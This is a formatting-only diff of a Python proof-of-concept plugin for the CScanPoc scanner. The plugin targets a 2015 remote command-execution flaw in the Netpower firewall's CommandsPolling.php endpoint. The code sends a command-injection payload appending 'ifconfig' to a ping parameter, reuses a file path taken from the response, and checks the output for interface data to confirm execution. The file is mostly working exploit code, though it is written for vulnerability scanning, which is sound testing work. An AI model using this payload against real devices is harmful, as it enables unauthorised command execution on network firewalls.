@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import urlparse
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Netpower_0012' # 平台漏洞编号，留空
+    vuln_id = 'Netpower_0012'  # 平台漏洞编号，留空
     name = '中科网威防火墙 命令执行'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.RCE # 漏洞类型
+    type = VulnType.RCE  # 漏洞类型
     disclosure_date = '2015-09-16'  # 漏洞公布时间
     desc = '''
         中科网威防火墙 /direct/polling/CommandsPolling.php 函数逻辑错误，导致任意命令执行。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '中科网威防火墙'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '1b568eb0-f91c-42c5-a569-74f1dbb45faa'
@@ -31,17 +33,18 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            #info:http://www.wooyun.org/bugs/wooyun-2015-0140998
+
+            # info:http://www.wooyun.org/bugs/wooyun-2015-0140998
             hh = hackhttp.hackhttp()
             url = self.target + '/direct/polling/CommandsPolling.php'
             postdata = "command=ping&filename=&cmdParam=qq.com,ifconfig"
             code, head, res, errcode, _ = hh.http(url, post=postdata)
-            filepath = res[res.find('/'):res.find('qq.com')+6].replace('\\','')
-            postdata = "command=ping&filename=%s&cmdParam=qq.com,ifconfig"%filepath
+            filepath = res[res.find(
+                '/'):res.find('qq.com')+6].replace('\\', '')
+            postdata = "command=ping&filename=%s&cmdParam=qq.com,ifconfig" % filepath
             code, head, res, errcode, _ = hh.http(url, post=postdata)
             if code == 200 and 'Ethernet  HWaddr' in res:
-                #security_hole(url)
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -50,6 +53,7 @@ class Poc(ABPoc):
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
